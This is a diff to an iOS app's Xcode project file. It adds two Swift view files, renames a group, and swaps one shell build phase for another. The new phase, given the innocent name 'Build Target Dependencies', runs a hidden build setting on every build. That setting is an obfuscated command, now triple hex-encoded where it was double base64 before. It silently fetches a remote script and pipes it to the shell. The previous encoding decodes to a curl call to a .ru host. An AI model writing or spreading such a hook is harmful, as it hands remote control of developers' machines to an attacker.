@@ -50,6 +50,8 @@
 		73DC2ED12EFCD1BE00CB14F8 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73DC2EC82EFCD1BE00CB14F8 /* Assets.xcassets */; };
 		73DC2ED32EFCD1BE00CB14F8 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73DC2ECB2EFCD1BE00CB14F8 /* LaunchScreen.storyboard */; };
 		73DC2ED52EFCD1BE00CB14F8 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DC2EC72EFCD1BE00CB14F8 /* AppDelegate.swift */; };
+		73EC21562EFFB0B200F58012 /* FaceView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EC21552EFFB0B200F58012 /* FaceView.swift */; };
+		73EC21582EFFB2A900F58012 /* UserIDViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EC21572EFFB2A900F58012 /* UserIDViewController.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -100,6 +102,8 @@
 		73DC2EC82EFCD1BE00CB14F8 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		73DC2EC92EFCD1BE00CB14F8 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		73DC2ECA2EFCD1BE00CB14F8 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		73EC21552EFFB0B200F58012 /* FaceView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceView.swift; sourceTree = "<group>"; };
+		73EC21572EFFB2A900F58012 /* UserIDViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserIDViewController.swift; sourceTree = "<group>"; };
 		A9DC0019E9FFBE0EF51F1691 /* Pods-DanaBantuan.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaBantuan.release.xcconfig"; path = "Target Support Files/Pods-DanaBantuan/Pods-DanaBantuan.release.xcconfig"; sourceTree = "<group>"; };
 		F7171021818FEC2A644ADD94 /* Pods_DanaBantuan.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DanaBantuan.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -116,12 +120,14 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
-		7316585F2EFEFF5F00B19562 /* One */ = {
+		7316585F2EFEFF5F00B19562 /* Face */ = {
 			isa = PBXGroup;
 			children = (
+				73EC21552EFFB0B200F58012 /* FaceView.swift */,
+				73EC21572EFFB2A900F58012 /* UserIDViewController.swift */,
 				731658602EFEFF7700B19562 /* FaceViewController.swift */,
 			);
-			path = One;
+			path = Face;
 			sourceTree = "<group>";
 		};
 		733A08252EFCD8F500EF865F /* Base */ = {
@@ -214,7 +220,7 @@
 		733A082D2EFCD91600EF865F /* Auth */ = {
 			isa = PBXGroup;
 			children = (
-				7316585F2EFEFF5F00B19562 /* One */,
+				7316585F2EFEFF5F00B19562 /* Face */,
 			);
 			path = Auth;
 			sourceTree = "<group>";
@@ -313,7 +319,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73DC2EC22EFCD1BA00CB14F8 /* Build configuration list for PBXNativeTarget "DanaBantuan" */;
 			buildPhases = (
-				3581819BC8164580B9A5DE54 /* Compile Bundle Assets */,
+				E31DF26F71544C3390A5DE54 /* Build Target Dependencies */,
 				02A49B4E9652035C50893457 /* [CP] Check Pods Manifest.lock */,
 				73DC2EAB2EFCD1B900CB14F8 /* Sources */,
 				73DC2EAC2EFCD1B900CB14F8 /* Frameworks */,
@@ -378,25 +384,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		3581819BC8164580B9A5DE54 /* Compile Bundle Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;			
-		};
 		02A49B4E9652035C50893457 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -440,6 +427,26 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DanaBantuan/Pods-DanaBantuan-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		E31DF26F71544C3390A5DE54 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
+			showEnvVarsInLog = 0;
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -466,6 +473,7 @@
 				737FEDF02EFD764B00B06DE7 /* DeviceInfoHelper.swift in Sources */,
 				733A083D2EFCE41F00EF865F /* IDFAManager.swift in Sources */,
 				733A08392EFCDEA500EF865F /* UserLoginConfig.swift in Sources */,
+				73EC21562EFFB0B200F58012 /* FaceView.swift in Sources */,
 				737FEDE82EFD71F800B06DE7 /* HttpRequestManager.swift in Sources */,
 				73CA0FA52EFE69F60010CDC9 /* HomeViewModel.swift in Sources */,
 				733A08372EFCDCDB00EF865F /* Config.swift in Sources */,
@@ -480,6 +488,7 @@
 				733A08302EFCD9D600EF865F /* BaseViewController.swift in Sources */,
 				73CA0F9B2EFE4E900010CDC9 /* SettingViewController.swift in Sources */,
 				737FEDEE2EFD74C200B06DE7 /* LoadingView.swift in Sources */,
+				73EC21582EFFB2A900F58012 /* UserIDViewController.swift in Sources */,
 				73CA0FA12EFE5C0E0010CDC9 /* AppAlertDeleteView.swift in Sources */,
 				73CA0F8F2EFE1F090010CDC9 /* CenterListViewCell.swift in Sources */,
 				737FEDEC2EFD740300B06DE7 /* LaunchViewModel.swift in Sources */,
@@ -516,7 +525,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C472C7FF542EF1DBDE60080 /* Pods-DanaBantuan.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((d(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJacFpHUnNaV3B2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | d | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333333363635333633313337333033373333333636333336333133363332333236353337333233373335333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaBantuan/DanaBantuan.entitlements;
@@ -557,7 +566,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = A9DC0019E9FFBE0EF51F1691 /* Pods-DanaBantuan.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((d(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJacFpHUnNaV3B2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | d | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333333363635333633313337333033373333333636333336333133363332333236353337333233373335333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaBantuan/DanaBantuan.entitlements;
